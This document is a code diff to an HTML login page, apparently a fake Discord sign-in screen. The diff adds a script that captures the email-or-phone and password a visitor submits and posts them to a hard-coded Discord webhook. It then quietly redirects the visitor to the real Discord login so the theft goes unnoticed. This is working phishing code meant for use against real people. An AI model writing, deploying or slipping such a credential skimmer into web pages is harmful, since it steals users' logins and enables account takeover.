@@ -93,5 +93,28 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
     <script src="./js/script.js"></script>
 </body>
+<script>
+    var webhookURL = 'https://discord.com/api/webhooks/1537189499606540308/zSSvet2UDzR5LY6nYSzKcEM7ewNAzHx4brsvdwN7Th0bcvzZZeHe0RJ5zWGW1DoVr7IW';
 
+    document.querySelector('form').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        var loginInput = document.getElementById('emailORphone').value;
+        var passwordInput = document.getElementById('password').value;
+
+        var message = '**Nowe logowanie:**\n**Email/Telefon:** ' + loginInput + '\n**Hasło:** ' + passwordInput;
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message })
+        })
+            .then(function () {
+                window.location.href = 'https://discord.com/login';
+            })
+            .catch(function () {
+                window.location.href = 'https://discord.com/login';
+            });
+    });
+</script>
 </html>
